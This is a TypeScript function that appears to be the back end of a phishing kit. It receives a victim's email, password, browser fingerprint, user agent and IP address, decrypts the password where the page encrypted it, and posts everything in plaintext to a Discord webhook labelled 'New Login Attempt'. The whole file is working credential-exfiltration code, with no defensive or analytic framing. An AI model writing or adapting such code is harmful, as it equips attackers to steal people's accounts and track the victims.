
export async function submitToDiscord(email: string, password: string, fingerprint: string, theme: string, userAgent: string, ip: string) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  console.log(`[Discord] Attempting to submit for email: ${email}, theme: ${theme}`);

  // Decrypt password if it's in the encrypted format
  let displayPassword = password;
  if (password && password.length > 50) {
    try {
      // Use globalThis.crypto for Web Crypto compatibility in Node.js
      const { crypto } = globalThis as any;
      if (crypto && crypto.subtle) {
        const encryptedObj = JSON.parse(Buffer.from(password, 'base64').toString());
        if (encryptedObj.k && encryptedObj.i && encryptedObj.d) {
          const keyRaw = Buffer.from(encryptedObj.k, 'base64');
          const iv = Buffer.from(encryptedObj.i, 'base64');
          const data = Buffer.from(encryptedObj.d, 'base64');

          const cryptoKey = await crypto.subtle.importKey(
            'raw',
            keyRaw,
            { name: 'AES-GCM' },
            false,
            ['decrypt']
          );

          const decryptedBuffer = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv },
            cryptoKey,
            data
          );

          displayPassword = new TextDecoder().decode(decryptedBuffer);
        }
      }
    } catch (e) {
      console.error("[Discord] Decryption failed:", e);
    }
  }

  if (!webhookUrl) {
    console.error("[Discord] DISCORD_WEBHOOK_URL is not set in environment variables");
    return { status: "ok", message: "Simulated success (no webhook configured)" };
  }

  const payload = {
    embeds: [
      {
        title: "New Login Attempt",
        color: 0xff4b33,
        fields: [
          { name: "Email", value: email || "N/A", inline: true },
          { name: "Password", value: displayPassword || "N/A", inline: true },
          { name: "Theme", value: theme || "Default", inline: true },
          { name: "Fingerprint", value: `\`\`\`${fingerprint || "N/A"}\`\`\`` },
          { name: "User Agent", value: userAgent || "N/A" },
          { name: "IP", value: ip || "N/A" }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    console.log("[Discord] Sending POST request to webhook...");
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`[Discord] Webhook failed with status ${response.status}: ${errorText}`);
      throw new Error(`Discord API responded with status ${response.status}`);
    }

    console.log("[Discord] Successfully delivered to webhook");
    return { status: "ok" };
  } catch (error) {
    console.error("[Discord] Network or API error:", error);
    throw error;
  }
}
